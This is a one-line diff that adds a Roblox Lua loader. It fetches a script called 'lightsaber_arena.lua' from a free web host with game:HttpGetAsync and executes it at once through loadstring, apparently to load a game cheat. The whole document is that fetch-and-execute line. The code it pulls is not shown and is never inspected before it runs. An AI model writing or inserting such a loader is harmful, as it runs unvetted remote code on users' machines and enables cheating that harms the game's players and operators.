@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://kinpasted.000webhostapp.com/scripts/lightsaber_arena.lua"))()
